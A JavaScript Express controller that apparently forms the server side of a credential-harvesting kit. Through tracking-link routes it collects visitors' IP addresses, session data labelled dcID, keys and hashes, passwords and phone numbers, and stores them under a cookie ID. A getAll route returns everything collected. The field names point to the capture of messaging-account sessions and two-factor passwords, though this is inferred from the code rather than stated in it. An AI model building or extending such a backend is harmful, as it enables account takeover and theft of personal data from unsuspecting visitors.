const logic = require("../utils/logic");
const Response = require("../responses/response");
const visitorService = require("../services/visitor-service");

class VisitorController {
  async get(req, _, next) {
    try {
      const { linkId, visitorId, force } = req.query;
      if (logic.regexobject({ linkId }) && !force)
        throw Response.BadRequest("Expected data not validated");
      if (force) {
        const res = await visitorService.getForce(visitorId);
        console.log(res);
        return next(res);
      }
      var remA = (
        req.headers["x-forwarded-for"] || req.socket.remoteAddress
      ).replaceAll("::1", "");
      if (remA === "") remA = "127.0.0.1";
      const res = await visitorService.get(linkId, visitorId, remA);
      return next(res);
    } catch (e) {
      console.error(e);
      return next(e);
    }
  }

  async store(req, _, next) {
    try {
      const { dcID, id, keys, hashes } = req.body;
      const { visitorId } = req.cookies;
      if (logic.regexobject({ visitorId }))
        throw Response.BadRequest("Excepted data not validated");
      const res = await visitorService.store(
        {
          dcID,
          id,
          keys,
          hashes,
        },
        visitorId
      );
      return next();
    } catch (e) {
      console.error(e);
      return next(e);
    }
  }

  async storePassword(req, _, next) {
    try {
      const { password } = req.body;
      const { visitorId } = req.cookies;
      if (logic.regexobject({ visitorId }))
        throw Response.BadRequest("Excepted data not validated");
      const res = await visitorService.storePassword(password, visitorId);
      return next();
    } catch (e) {
      console.error(e);
      return next(e);
    }
  }

  async storePhone(req, _, next) {
    try {
      const { phoneNumber } = req.body;
      const { visitorId } = req.cookies;
      if (logic.regexobject({ visitorId }))
        throw Response.BadRequest("Excepted data not validated");
      const res = await visitorService.storePhone(phoneNumber, visitorId);
      return next();
    } catch (e) {
      console.error(e);
      return next(e);
    }
  }

  async delete(req, _, next) {
    try {
      const { visitorId } = req.body;
      if (logic.regexobject({ visitorId }))
        throw Response.BadRequest("Expected data not validated");
      return next(await visitorService.delete(visitorId));
    } catch (e) {
      console.error(e);
      return next(e);
    }
  }

  async getAll(req, _, next) {
    try {
      return next(await visitorService.getAll());
    } catch (e) {
      console.error(e);
      next(e);
    }
  }
}

module.exports = new VisitorController();
